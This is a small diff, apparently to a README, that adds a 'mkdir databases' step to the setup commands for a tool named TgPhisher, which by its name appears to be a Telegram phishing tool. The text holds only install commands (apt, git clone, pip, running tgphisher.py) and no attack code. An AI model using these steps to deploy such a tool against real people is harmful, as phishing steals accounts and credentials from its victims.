@@ -9,6 +9,7 @@ apt update && apt upgrade -y
 apt install python3 git python3-pip
 git clone https://github.com/ImmortalNameless/TgPhisher
 cd TgPhisher
+mkdir databases
 pip3 install -r requirements.txt
 python3 tgphisher.py
 ```
